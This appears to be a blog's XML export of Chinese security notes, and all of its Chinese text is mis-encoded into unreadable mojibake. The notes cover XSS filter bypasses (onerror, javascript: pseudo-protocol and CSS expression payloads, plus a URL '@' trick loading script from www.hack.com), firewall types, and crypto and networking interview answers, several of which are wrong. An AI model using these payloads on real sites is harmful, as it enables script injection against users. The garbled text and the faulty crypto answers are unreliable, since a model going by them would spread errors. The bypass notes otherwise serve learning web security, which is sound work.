<li>å¦‚æœä»£ç ä¸­å¯¹æ³¨é‡Šæ²¡æœ‰åšè¿‡æ»¤åˆ™å¯ä»¥æ„é€ å¦‚ä¸‹çš„è¯­å¥ <code>&lt;!â€”&lt;a href=&quot;â€”&gt;&lt;img src=x onerror=alert(111)//&quot;&gt;test&lt;/a&gt;,</code>å¯¹è¿‡æ»¤å™¨æ¥ä¹¦æ³¨é‡Šæ˜¯ä¸å­˜åœ¨çš„ï¼Œé‚£ä¹ˆè¿‡æ»¤å™¨ä¼šè®¤ä¸ºä¸Šè¿°è¯­å¥ä¸ºä¸€ä¸ªaæ­£å¸¸çš„aæ ‡ç­¾ï¼Œä½†å¯¹æµè§ˆå™¨æ¥è¯´ï¼Œä¸Šè¿°åˆ™æ˜¯ä¸€ä¸ªimgæ ‡ç­¾ã€‚</li>
</ol>
</li>
<li><p>é’ˆå¯¹IEæµè§ˆå™¨çš„ç‰¹æ®Šè¯­å¥</p>
<p> <img src="/archives/6eecc4bb/9bc82c060f205c9654462f96a831bb4.jpg"></p>
</li>
</ol>
<p><strong>å±æ€§ä¸­çš„æ³¨å…¥</strong></p>
<ol>
<li><p>å±æ€§å€¼å¤§å°å†™ä¸æ•æ„Ÿã€å¼•å·ä¸æ•æ„Ÿï¼ŒIEä¸­å¯ä»¥ç»™ä½¿ç”¨&#96;</p>
</li>
<li><p>æ ‡ç­¾ä¸å±æ€§ã€å±æ€§åä¸ç­‰å·ã€ç­‰å·ä¸å±æ€§å€¼ä¹‹é—´å¯ä»¥ç”¨ç©ºæ ¼ã€æ¢è¡Œç¬¦ã€å›è½¦ç¬¦ã€è¿‡ç€tabç­‰æ›¿ä»£</p>
</li>
<li><p>å¯ä»¥å†å±æ€§çš„å¤´éƒ¨ä¸å°¾éƒ¨åŠ ä¸Šasciiä¸­çš„æ§åˆ¶å­—ç¬¦ å¦‚&amp;#32</p>
</li>
<li><p>jsä¸­ä¸€ä¸ªå‡½æ•°å¯ä»¥åœ¨å¦ä¸€ä¸ªå‡½æ•°ä¸­æ‰§è¡Œ</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1. <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;do_some_func(&#x27;&#x27;,alert(111),&#x27;&#x27;)&quot;</span>&gt;</span></span><br><span class="line">2. <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">&quot;do_some_func(&#x27;&#x27;,functiong()&#123;alert(11);alert(22)&#125;,&#x27;&#x27;)&quot;</span>&gt;</span> #æ‰§è¡Œå¤šæ¡è¯­å¥åº”å®šä¹‰åŒ¿åå‡½æ•°</span><br></pre></td></tr></table></figure>
</li>
<li><p>èµ„æºç±»å±æ€§åé¢å¯ä»¥æ·»åŠ ä¼ªåè®®ï¼Œå½“ç„¶è¯¥åŠŸèƒ½ç°å¦‚ä»Šå·²ç»è¢«å±è”½äº†ï¼Œä¸è¿‡IE6æ˜¯æ”¯æŒçš„ï¼Œä¸è¿‡<code>&lt;iframe&gt;</code>ä¸­çš„ä¼ªåè®®å¹¶æ²¡æœ‰è¢«å±è”½</p>
</li>
<li><p>å¯ä»¥åˆ©ç”¨urlçš„@å±æ€§ç»•è¿‡</p>
<p> å¦‚è¦æ±‚è¾“å…¥urlåœ°å€å¦‚ä¸‹ï¼Œsrc&#x3D;<a href="http://www.baidu.com,å…¶ä¸­ruléƒ¨åˆ†æ˜¯æˆ‘ä»¬éœ€è¦æ„é€ payloadçš„åœ°æ–¹,å¦‚æœè¯¥å¤„çš„ç‰¹æ®Šå­—ç¬¦è¢«è¿‡æ»¤æ‰äº†,æˆ‘ä»¬åˆ™å¯ä»¥é€šè¿‡å¤–éƒ¨å¼•å…¥jsä»£ç çš„å½¢å¼ç»•è¿‡,å¦‚/">http://www.baidu.comï¼Œå…¶ä¸­ruléƒ¨åˆ†æ˜¯æˆ‘ä»¬éœ€è¦æ„é€ payloadçš„åœ°æ–¹ï¼Œå¦‚æœè¯¥å¤„çš„ç‰¹æ®Šå­—ç¬¦è¢«è¿‡æ»¤æ‰äº†ï¼Œæˆ‘ä»¬åˆ™å¯ä»¥é€šè¿‡å¤–éƒ¨å¼•å…¥jsä»£ç çš„å½¢å¼ç»•è¿‡ï¼Œå¦‚</a></p>
<p> src&#x3D;<a href="http://www.baidu.com@www.hack.com/inject.js">http://www.baidu.com@www.hack.com/inject.js</a> è¿™æ ·@å‰é¢çš„å†…å®¹å°±è¢«å½“ä½œäº†ç”¨æˆ·åã€‚</p>
</li>
<li><p>æ”¯æŒä¼ªåè®®çš„ä¸å¸¸è§æ ‡ç­¾å±æ€§</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">dybsrc</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>(IE6)</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">lowsrc</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>(IE6)</span><br><span class="line"><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">action</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;img&quot;</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>äº‹ä»¶</strong></p>
<p><strong>CSSä¸­çš„ä»£ç æ³¨å…¥æŠ€å·§</strong></p>
<p>cssåˆ†ä¸ºé€‰æ‹©ç¬¦ã€å±æ€§åã€å±æ€§å€¼ã€è§„åˆ™ï¼ˆ@charsetï¼‰ã€å£°æ˜ï¼ˆ!importï¼‰</p>
<p>cssä»£ç ä¸­æˆ‘ä»¬å¯ä»¥æ’å…¥ä»£ç çš„éƒ¨åˆ†åªæœ‰èµ„æºç±»å±æ€§å€¼å’Œ@importè§„åˆ™</p>
<p>csså±æ€§åçš„ä»»ä½•åœ°æ–¹éƒ½å¯ä»¥æ’å…¥åæ–œçº¿\ä¸€å®¶åæ–œçº¿åŠ 0çš„å„ç§ç»„åˆ</p>
<p>@im\po\rt â€œurlâ€ &#x2F;&#x2F;å¼•å…¥ä¸€æ®µcssä»£ç </p>
<p>@im\po\0000000rt â€œurlâ€</p>
<p>å£°æ˜æ€»åŒ…å«!importæ•…ï¼Œè¯¥é’ˆå¯¹è¯¥æ–¹æ³•çš„è¿‡æ»¤æ•ˆæœå¹¶ä¸å¥½ï¼Œç»™äº†æˆ‘ä»¬å¯ä¹˜ä¹‹æœº</p>
<p>ä½¿ç”¨expressionæ–¹æ³•åœ¨IEä¸­æ‰§è¡Œjsä»£ç ï¼Œä¸è¿‡ç›´æ¥æ’å…¥è¯¥æ–¹æ³•ä¼šå¯¼è‡´ï¼Œæ’å…¥çš„æ•°æ®åœ¨é¡µé¢ä¸­ä¸€è‡´å¾ªç¯ï¼Œæˆ‘ä»¬éœ€è¦ç”¨è¯­å¥é™åˆ¶è¿™ç§å¾ªç¯</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="title function_">expression</span>(<span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">x</span>!=<span class="number">1</span>)(<span class="title function_">alert</span>(<span class="number">1</span>);<span class="variable language_">window</span>.<span class="property">x</span>=<span class="number">1</span>;));</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ³¨é‡Šæ¥æ··æ·†expressionæ–¹æ³•</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">body&#123;<span class="attr">xss</span>:ex<span class="comment">/**/</span>pressi<span class="comment">/**/</span><span class="title function_">on</span>((<span class="variable language_">window</span>.<span class="property">x</span>==<span class="number">1</span>)?<span class="string">&#x27;&#x27;</span>:<span class="built_in">eval</span>(<span class="string">&#x27;x=1;alert(33333)&#x27;</span>));&#125;</span><br></pre></td></tr></table></figure>

<p>IE6ä¸­å¯ä»¥é€šè¿‡ä½¿ç”¨å…¨è§’å­—ç¬¦ç»•è¿‡</p>
<p>ç¼–ç ç»•è¿‡</p>
]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>è¯»ä¹¦ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>å‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title>é˜²ç«å¢™</title>
    <url>/archives/9c75190f.html</url>
    <content><![CDATA[<h1 id="é˜²ç«å¢™"><a href="#é˜²ç«å¢™" class="headerlink" title="é˜²ç«å¢™"></a>é˜²ç«å¢™</h1><p>é˜²ç«å¢™ä¸€èˆ¬ä¸èƒ½é˜²æ­¢ç—…æ¯’ï¼Œåªè´Ÿè´£è¿‡æ»¤æµé‡ï¼Œä¸€èˆ¬æ™®éçš„æ˜¯äºŒä¸‰å››å±‚çš„é˜²ç«å¢™ï¼ŒåŸºäºip\ç«¯å£å·ç­‰è¿›è¡Œæµé‡è¿‡æ»¤ï¼Œèƒ½æœ‰æ•ˆé˜²ç«ddosæ”»å‡»ã€‚é˜²ç«å¢™å…¼å…·è·¯ç”±ã€vpnç­‰åŠŸèƒ½</p>
<h2 id="ç±»å‹"><a href="#ç±»å‹" class="headerlink" title="ç±»å‹"></a><strong>ç±»å‹</strong></h2><ol>
<li>ä»£ç†é˜²ç«å¢™<ol>
<li>é˜²ç«å¢™ä½œä¸ºä¸€ä¸ªä»£ç†ï¼Œå†…ç½‘æµé‡åˆ°è¾¾é˜²ç«å¢™ä¹‹åï¼Œé˜²ç«å¢™å›å¤æºä¸»æœºï¼Œç›®æ ‡å·²åˆ°è¾¾ï¼Œå¹¶åŒæ—¶ä¿®æ”¹æºipåœ°å€å¯¹æ•°æ®åŒ…è¿›è¡Œä»£ç†è½¬å‘ã€‚æ•´ä¸ªæ˜¯é€æ˜çš„</li>
</ol>
</li>
<li>çŠ¶æ€æ£€æµ‹é˜²ç«å¢™<ol>
<li>å½“å†…ç½‘æµé‡åˆ°è¾¾åï¼Œé˜²ç«å¢™æ£€æŸ¥çŠ¶æ€ä¿¡æ¯ï¼Œå‘ç°æ²¡æœ‰åŒ¹é…çš„çŠ¶æ€ï¼Œäºæ˜¯æ£€æŸ¥ç­–ç•¥ï¼Œå‘ç°è¯¥æµé‡æ˜¯å…è®¸é€šè¿‡çš„ï¼Œäºæ˜¯è®°å½•æºipç›®æ ‡ipPæºç«¯å£å·ç›®æ ‡ç«¯å£å·ä¿å­˜ä½œä¸ºä¸€æ¡çŠ¶æ€æ¶ˆæ¯ï¼Œç„¶åæ£€æŸ¥è·¯ç”±è¡¨ã€natåœ°å€æ± ç­‰è®°å½•å…³é”®ä¿¡æ¯ä½œä¸ºçŠ¶æ€ï¼Œç„¶åå°†æµé‡è¿›è¡Œæ”¾è¡Œã€‚</li>
<li>å½“æµé‡å›æ¥åï¼Œé˜²ç«å¢™é¦–å…ˆè¿›è¡ŒçŠ¶æ€åŒ¹é…ï¼Œè‹¥æˆåŠŸåˆ™é€šè¿‡è¯¥çŠ¶æ€ä¸­å­˜å‚¨çš„ä¿¡æ¯å¯¹æ•°æ®è¿›è¡Œè£…æ³•ï¼Œè€Œä¸å¿…åœ¨æ£€æŸ¥ç­–ç•¥ã€æ£€æŸ¥è·¯ç”±è¡¨ç­‰æ“ä½œã€‚</li>
</ol>
</li>
<li>DPI æ·±åº¦åŒ…æ£€æµ‹æŠ€æœ¯</li>
<li>IPS å…¥ä¾µé˜²å¾¡ç³»ç»Ÿ -åº”ç”¨å±‚é˜²ç«å¢™<ol>
<li>æ£€æµ‹å¹¶å¤„ç†</li>
<li>é€šè¿‡ç‰¹å¾åº“æ¥å¯¹æµé‡è¿›è¡Œè¿‡æ»¤</li>
</ol>
</li>
<li>IDS å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ -åº”ç”¨å±‚é˜²ç«å¢™<ol>
<li>åªåšæ£€æµ‹ï¼Œä¸åšå¤„ç†ï¼Œé€šå¸¸ä½¿ç”¨æ—è·¯å®‰è£…ï¼Œå°†ç»çš„æµé‡å¤åˆ¶ä¸€ä»½è¿›è¡Œæ£€æµ‹ï¼Œæ˜¯é€æ˜çš„ã€‚</li>
<li>é€šè¿‡ç‰¹å¾åº“æ¥å¯¹æµé‡è¿›è¡Œè¿‡æ»¤</li>
</ol>
</li>
<li>waf webåº”ç”¨é˜²ç«å¢™<ol>
<li>åªé’ˆå¯¹webåº”ç”¨è¿›è¡Œæ£€æµ‹</li>
</ol>
</li>
<li>ç”¨æˆ·è¡Œä¸ºé˜²ç«å¢™<ol>
<li>æ£€æŸ¥å½“å‰ç”¨æˆ·çš„ä¸Šç½‘è¡Œä¸ºï¼Œå¯¹ç”¨æˆ·ä¸Šç½‘è¡Œä¸ºè¿›è¡Œç›‘æ§ï¼Œæ§åˆ¶ç”¨æˆ·çš„è®¿é—®æƒ…å†µï¼ŒåŒ…æ‹¬èƒ½è®¿é—®é‚£äº›ç½‘ç«™ï¼Œèƒ½ä½¿ç”¨é‚£äº›åº”ç”¨ï¼Œä¸èƒ½ä½¿ç”¨é‚£äº›åº”ç”¨ç­‰ã€‚</li>
</ol>
</li>
</ol>
<h2 id="è¡¡é‡æŒ‡æ ‡"><a href="#è¡¡é‡æŒ‡æ ‡" class="headerlink" title="è¡¡é‡æŒ‡æ ‡"></a><strong>è¡¡é‡æŒ‡æ ‡</strong></h2><ol>
<li>ååé‡</li>
<li>æ—¶å»¶</li>
<li>ä¸¢åŒ…ç‡</li>
<li>å¹¶å‘è¿æ¥æ•°ï¼šèƒ½åŒæ—¶å¤„ç†çš„ä¼šè¯</li>
<li>æ–°å»ºè¿æ¥æ•°ï¼šå•ä½æ—¶é—´å†…èƒ½åŒæ—¶æ–°å»ºçš„è¿æ¥æ•°</li>
</ol>
<h2 id="åº”ç”¨æ¨¡å¼"><a href="#åº”ç”¨æ¨¡å¼" class="headerlink" title="åº”ç”¨æ¨¡å¼"></a><strong>åº”ç”¨æ¨¡å¼</strong></h2><ol>
<li>é€æ˜æ¨¡å¼ï¼šé˜²ç«å¢™ç«¯å£å·¥ä½œåœ¨äºŒå±‚ç«¯å£ï¼Œå¯¹æ•´ä¸ªç½‘ç»œæ¥è¯´æ˜¯é€æ˜çš„ï¼Œä¸‰ä¸ªåŒºåŸŸå·¥ä½œåœ¨åŒä¸€ä¸ªç½‘æ®µ</li>
<li>è·¯ç”±æ¨¡å¼ï¼šé˜²ç«å¢™ç«¯å£å·¥ä½œåœ¨ä¸‰å±‚ç«¯å£ï¼Œå¯é…ç½®nat\è·¯ç”±\vpnç­‰ï¼Œä¸‰ä¸ªåŒºåŸŸå·¥ä½œåœ¨ä¸åŒçš„ç½‘æ®µ</li>
<li>æ··æ‚æ¨¡å¼ï¼šè¿æ¥å¤–ç½‘çš„ç«¯å£å·¥ä½œåœ¨ä¸‰å±‚ï¼Œå¦å¤–ä¸¤ä¸ªåŒºåŸŸçš„ç«¯å£å·¥ä½œåœ¨äºŒå±‚ã€‚ä¹Ÿå¯ä»¥è®©å¤–éƒ¨åŒºåŸŸä¸DMZåŒºåŸŸçš„å‡ å£å·¥ä½œåœ¨ä¸‰å±‚ï¼ŒDMZåŒºåŸŸä½¿ç”¨å…¬ç½‘IPï¼Œå†…éƒ¨åŒºåŸŸæ¥å£å·¥ä½œåœ¨äºŒå±‚ã€‚</li>
</ol>
<h2 id="åŒºåŸŸéš”ç¦»"><a href="#åŒºåŸŸéš”ç¦»" class="headerlink" title="åŒºåŸŸéš”ç¦»"></a><strong>åŒºåŸŸéš”ç¦»</strong></h2><p>ä¸€èˆ¬åˆ’åˆ†ä¸ºä¸‰ä¸ªåŒºåŸŸï¼Œç”¨æ¥é…ç½®ç­–ç•¥</p>
<ol>
<li>DMZ	éå†›äº‹åŒ–åŒº ï¼Œå½“æœ‰ç½‘ç«™éœ€è¦å¯¹å¤–å‘å¸ƒçš„æ—¶å€™è®¾ç½®è¯¥åŒºåŸŸï¼Œè¯¥åŒºåŸŸä¸€èˆ¬ä¸é…ç½®å‘å†…ç½‘çš„ç­–ç•¥ï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½è®¿é—®å†…ç½‘ï¼Œç”¨ä»¥ä¿è¯å†…ç½‘çš„å®‰å…¨ã€‚</li>
<li>å†…éƒ¨åŒºåŸŸ</li>
<li>å¤–éƒ¨åŒºåŸŸ</li>
</ol>
<h2 id="HAæŠ€æœ¯-åŒæœºçƒ­å¤‡"><a href="#HAæŠ€æœ¯-åŒæœºçƒ­å¤‡" class="headerlink" title="HAæŠ€æœ¯-åŒæœºçƒ­å¤‡"></a>HAæŠ€æœ¯-åŒæœºçƒ­å¤‡</h2><p>ä¸¤å°é˜²ç«å¢™ï¼Œä¸€å°ä¸ºä¸»é˜²ç«å¢™ï¼Œä¸€å°ä¸ºå¤‡ä»½é˜²ç«å¢™ï¼Œä¸¤å°é˜²ç«å¢™é€šè¿‡å¿ƒè·³çº¿è¿æ¥èµ·æ¥ï¼Œäº’ç›¸äº¤æ¢çŠ¶æ€ä¿¡æ¯ï¼Œé˜²ç«å¢™æ•°æ®ã€‚ä¸¤å°é˜²ç«å¢™åŒä¸€ä¾§çš„ipåœ°å€ä¸€æ ·ï¼Œå¿ƒè·³çº¿ä¸¤å¤´çš„ipåœ°å€ä¸ä¸€æ ·ã€‚</p>
]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>å®‰å…¨è®¾å¤‡</category>
      </categories>
      <tags>
        <tag>é˜²ç«å¢™</tag>
      </tags>
  </entry>
  <entry>
    <title>é¢è¯•é¢˜æ•´ç†</title>
    <url>/archives/b7f3ad9b.html</url>
    <content><![CDATA[<h1 id="é¢è¯•é¢˜æ•´ç†"><a href="#é¢è¯•é¢˜æ•´ç†" class="headerlink" title="é¢è¯•é¢˜æ•´ç†"></a>é¢è¯•é¢˜æ•´ç†</h1><blockquote>
<p>èƒ½å¦è¯´å‡ºå¯¹ç§°åŠ å¯†ä¸éå¯¹ç§°åŠ å¯†çš„ä¸»è¦ä¸åŒç‚¹</p>
</blockquote>
<p>å¯¹ç§°åŠ å¯†é€šä¿¡åŒæ–¹ä½¿ç”¨åå•†å¥½çš„åŒä¸€å¯†é’¥è¿›è¡ŒåŠ å¯†è§£å¯†ï¼Œéå¯¹ç§°åŠ å¯†é€šä¿¡åŒæ–¹ä½¿ç”¨å¯†é’¥å¯¹è¿›è¡ŒåŠ è§£å¯†ï¼Œä¸€ä¸ªå…¬é’¥ï¼Œä¸€ä¸ªç§é’¥ï¼Œå…¬é’¥åŠ å¯†çš„æ•°æ®é€šè¿‡ç§é’¥è§£å¯†ï¼Œç§é’¥åŠ å¯†è¿‡çš„æ•°æ®é€šè¿‡å…¬é’¥è§£å¯†ã€‚å…¬é’¥ç”¨æ¥è§£å¯†ï¼Œç§é’¥ç”¨æ¥åšèº«ä»½éªŒè¯ã€‚</p>
<blockquote>
<p>å¸¸è§å¯¹ç§°åŠ å¯†ç®—æ³•</p>
</blockquote>
<p>DES </p>
<p>3DES  ä½¿ç”¨ä¸‰æ¡å¯†é’¥åŠ å¯†</p>
<p>AES</p>
<blockquote>
<p>å¯¹ç§°åŠ å¯†ä¸­åˆ†ç»„åŠ å¯†ä¸æµå¼åŠ å¯†çš„åŒºåˆ«</p>
</blockquote>
<p>éå¯¹ç§°åŠ å¯†å‡å±äºåˆ†ç»„å¯†ç </p>
<p>æµå¯†ç åˆç§°ä¸ºåºåˆ—å¯†ç ï¼Œä»¥åºåˆ—çš„æ–¹å¼åŠ å¯†ï¼Œé¦–å…ˆå°†ç§å­å¯†é’¥é€šè¿‡ç®—æ³•ç”Ÿæˆä¸€ä¸ªå¯†é’¥æµï¼Œè¿™ä¸ªä¸€ä¸ªè‰¯å¥½çš„ä¼ªéšæœºæ•°ã€‚ç„¶åæŒ‰æ¯”ç‰¹ä¸æ˜æ–‡æµæŒ‰ç…§åŠ å¯†ç®—æ³•è¿›è¡ŒåŠ å¯†å˜æ¢ã€‚åŠ å¯†è¿‡ç¨‹ä¸­çš„å¯†é’¥æµç”±ç§å­å¯†é’¥é€šè¿‡å¯†é’¥ç”Ÿæˆå™¨äº§ç”Ÿã€‚</p>
<p>åŠ å¯†è¿‡ç¨‹</p>
<p>ç§å­å¯†ç -&gt;éšæœºæ•°å‘ç”Ÿå™¨-&gt;å¯†é’¥æµ</p>
<p>æ˜æ–‡æµ-&gt;(é€šè¿‡å¯†é’¥æµ)-&gt;åŠ å¯†å˜æ¢-&gt;å¯†æ–‡æµ</p>
<p>åˆåˆ†ä¸ºåŒæ­¥å¯†é’¥æµä¸è‡ªåŒæ­¥å¯†é’¥æµ</p>
<p>åˆ†ç»„åŠ å¯†</p>
<p>åˆç§°å—å¯†ç ï¼Œåœ¨è¿›è¡ŒåŠ å¯†æ—¶ï¼Œå…ˆå°†æ˜æ–‡ç¼–ç¨‹äºŒè¿›åˆ¶ç»­æµï¼Œç„¶åå°†å…¶ç¼–ç¨‹è‹¥å¹²ä¸ªå›ºå®šé•¿åº¦çš„åˆ†ç»„ï¼Œä¸å¤Ÿé•¿åº¦çš„ç”¨0è¿›è¡Œå¡«å……åˆ°å›ºå®šé•¿åº¦ã€‚ç„¶åé€ä¸ªåˆ†ç»„ä¾æ¬¡è¿›è¡ŒåŠ å¯†æ“ä½œã€‚åˆ†ç»„é•¿çŸ­å½±å“å¯†ç å¼ºåº¦ï¼Œåˆ†ç»„é•¿åº¦ä¸èƒ½å¤ªçŸ­ä¹Ÿä¸èƒ½å¤ªé•¿ã€‚æ—¢è¦ä¾¿äºæ“ä½œä¸è¿ç®—åˆè¦ä¿è¯å¯†ç çš„å®‰å…¨æ€§ã€‚æ˜æ–‡åˆ†ç»„çš„é•¿åº¦å¯ä»¥ä¸å¯†é’¥åˆ†ç»„çš„é•¿åº¦ä¸ä¸€è‡´ï¼Œå½“æ˜æ–‡åˆ†ç»„é•¿çš„æ—¶å€™ï¼Œå³å¸¦æ•°æ®å‹ç¼©åŠŸèƒ½ï¼Œå¢åŠ äº†è§£å¯†çš„å¤æ‚åº¦ï¼Œå½“æ˜æ–‡åˆ†ç»„çŸ­çš„æ—¶å€™ï¼Œå¢åŠ äº†èµ„æºçš„æ¶ˆè€—ã€‚æ¯ä¸€ä¸ªæ˜æ–‡åˆ†ç»„ä½¿ç”¨çš„æ—¶åŒä¸€ä¸ªå¯†é’¥</p>
<p>åŠ å¯†è¿‡ç¨‹</p>
<p>æ˜æ–‡åˆ†ç»„m-&gt;é€šè¿‡å¯†é’¥kåŠ å¯†å˜æ¢-&gt;å¯†æ–‡åˆ†ç»„c-&gt;é€šè¿‡å¯†é’¥kè§£å¯†å˜æ¢-&gt;æ˜æ–‡æµåˆ†ç»„ã€‚å¦‚æœåœ¨ä¸€å®šå‘¨æœŸåå¯†é’¥é‡å¤ï¼Œé‚£ä¹ˆç§°ä¸ºå‘¨æœŸæµå¯†ç ï¼Œå¦åˆ™ä¸ºéå‘¨æœŸæµå¯†ç </p>
<p>åˆ†ç»„å¯†ç æ¯æ¬¡åªèƒ½å¤„ç†ä¸€ä¸ªå›ºå®šé•¿åº¦çš„æ˜æ–‡ï¼Œä¸è¶³è¿˜éœ€è¦è¡¥å…¨ï¼Œåˆ†ç»„å¯†ç çš„ä½“åˆ¶ä¸€èˆ¬é¦–å…ˆå°†Mâ€˜è¿›è¡Œå¡«å……å¾—åˆ°æ¶ˆæ¯Mï¼Œä½¿å…¶é•¿åº¦ä¸ºå›ºå®šåˆ†ç»„é•¿åº¦Lçš„æ•´æ•°å€ã€‚è€Œæµå¯†ç åŠ å¯†æ—¶ä¸ä¸€å®šå¾—åˆ°ç›¸åŒçš„å¯†ç ï¼Œå› ä¸ºæ˜æ–‡çš„é‡å¤éƒ¨åˆ†æ˜¯ä½¿ç”¨å¯†é’¥æµçš„ä¸åŒéƒ¨åˆ†åŠ å¯†çš„ã€‚å¯¹äºåˆ†ç»„å¯†ç ï¼Œåœ¨ä¸€ä¸ªå›ºå®šçš„å¯†é’¥çš„ä½œç”¨ä¸‹ï¼Œå¯¹ç›¸åŒçš„æ˜æ–‡åŠ å¯†ï¼Œä¸€å®šèƒ½å¾—åˆ°ç›¸åŒçš„å¯†æ–‡ã€‚</p>
<blockquote>
<p>è¯´å‡ºä¸€ç§æµå¼åŠ å¯†ç®—æ³•</p>
</blockquote>
<blockquote>
<p>è¯´å‡ºä¸€ç§éå¯¹ç§°åŠ å¯†ç®—æ³•</p>
</blockquote>
<p>RSA</p>
<blockquote>
<p>RSAä¸DHâ€”â€”Merkle-Hellmanéƒ½æ˜¯åŸºäºéå¯¹ç§°çš„åŠ å¯†ç®—æ³•ï¼Œæœ‰ä»€ä¹ˆä¸åŒå—</p>
</blockquote>
<p>dhç®—æ³•ä¼šåœ¨é€šä¿¡åŒæ–¹å„ç”Ÿæˆä¸€å¯¹å¯†é’¥ï¼Œå³æœ‰ä¸¤å¯¹å¯†é’¥ï¼Œè€Œä¸”å®ƒæ˜¯åŠ¨æ€çš„ã€‚rsaåªåŒ…å«ä¸€ç»„å¯†é’¥ï¼Œè€Œä¸”æ˜¯é™æ€çš„ï¼Œå³ä¸€æ—¦ç”Ÿæˆå¯†é’¥å°±ä¸ä¼šæ›´æ”¹ï¼Œé™¤éæ˜¾å¼å¾—æ›¿æ¢</p>
<blockquote>
<p>MDï¼ˆMessage Digestï¼‰ç®—æ³•çš„ä¸­æ–‡æ˜¯ä»€ä¹ˆï¼Ÿæ˜¯åŠ å¯†ç®—æ³•å—ï¼Ÿ</p>
</blockquote>
<p>ä¿¡æ¯æ‘˜è¦ç®—æ³•ï¼Œä¸æ˜¯åŠ å¯†ç®—æ³•ï¼Œç»è¿‡è¯¥ç®—æ³•åŠ å¯†çš„æ•°æ®ä¼šå½¢æˆå”¯ä¸€çš„ç­¾åæ¥æ ‡è¯†è¿™æ®µæ•°æ®ï¼Œé¿å…äº†æ•°æ®è¢«ä¼ªé€ çš„å¯èƒ½ã€‚ä¸æ˜¯ä¸€ç§åŠ å¯†ç®—æ³•ï¼Œå®ƒçš„è¿‡ç¨‹æ˜¯ä¸å¯é€†çš„ã€‚</p>
<blockquote>
<p>base32&#x2F;base64&#x2F;rot13æ˜¯åŠ å¯†ç®—æ³•å—</p>
</blockquote>
<p>ä¸æ˜¯ï¼Œåªæ˜¯ä¸€ç§æ•°æ®ç¼–ç æ–¹å¼ï¼Œrot13â€”-å›è½¬13</p>
<blockquote>
<p>ç½‘ç»œæ¨¡å‹æœ‰å‡ å±‚</p>
</blockquote>
<p>isoä¸ƒå±‚å‚è€ƒæ¨¡å‹â€”åº”ç”¨å±‚ã€ä¼šè¯å±‚ã€è¡¨ç¤ºå±‚ã€ä¼ è¾“å±‚ã€ç½‘ç»œå±‚ã€æ•°æ®é“¾è·¯å±‚ã€ç‰©ç†å±‚</p>
<p>tcp&#x2F;ipäº”å±‚æ¨¡å‹â€”â€”åº”ç”¨å±‚ã€ä¼ è¾“å±‚ã€ç½‘ç»œå±‚ã€æ•°æ®é“¾è·¯å±‚ã€ç‰©ç†å±‚</p>
<p>å››å±‚æ¨¡å‹â€”â€”â€”åº”ç”¨å±‚ã€ä¼ è¾“å±‚ã€ç½‘ç»œå±‚ã€ç½‘ç»œæ¥å£å±‚</p>
<blockquote>
<p>ä¸‰æ¬¡æ¡æ‰‹çš„è¿‡ç¨‹</p>
</blockquote>
<blockquote>
<p>å››æ¬¡æŒ¥æ‰‹çš„è¿‡ç¨‹</p>
</blockquote>
<blockquote>
<p>ICMPåè®®å±äºå“ªä¸€å±‚åè®®</p>
</blockquote>
<p>ç½‘ç»œå±‚      ç½‘ç»œæ¢æµ‹ä¸è·Ÿè¸ªåè®®</p>
<blockquote>
<p>httpè¯·æ±‚æ–¹å¼</p>
</blockquote>
<p>get post put delete trace connection  head options patch</p>
<blockquote>
<p>hostå¤´ä½œç”¨</p>
</blockquote>
<p>æ ‡è¯†è¦è¯·æ±‚çš„ä¸»æœº</p>
<blockquote>
<p>refererä½œç”¨</p>
</blockquote>
<p>æ ‡è¯†ä»å“ªä¸ªç½‘é¡µè¿‡æ¥çš„ï¼Œç”¨æ¥é˜²ç›—é“¾</p>
<blockquote>
<p>httpså¯†é’¥äº¤æ¢è¿‡ç¨‹</p>
</blockquote>
<p>å®¢æˆ·ç«¯å‘é€helloåŒ…ï¼ŒåŒ…æ‹¬tlsç‰ˆæœ¬ï¼ŒåŠ å¯†æ–¹å¼åˆ—è¡¨ï¼Œä¸€ä¸ªéšæœºæ•°</p>
<p>æœåŠ¡å™¨å‘é€hellåŒ…ï¼Œç¡®è®¤ä½¿ç”¨tlsçš„åŠ å¯†åˆ—è¡¨ï¼Œä¸€ä¸ªéšæœºæ•°</p>
<p>æœåŠ¡å™¨å‘é€å…¬é’¥è¯ä¹¦ï¼Œ</p>
<p>å®¢æˆ·ç«¯ä½¿ç”¨æ ¹è¯ä¹¦éªŒè¯å…¬é’¥è¯ä¹¦ï¼Œå¦‚æœèƒ½å¤Ÿè§£å¯†ï¼Œåˆ™ä¼šå‘ç¼–ç æ”¹å˜æ¶ˆæ¯ï¼Œå†å‘é€ä¸€ä¸ªéšæœºæ•°ï¼Œå¹¶æŠŠå¯¹ç§°å¯†é’¥å‘è¿‡å»ï¼Œ</p>
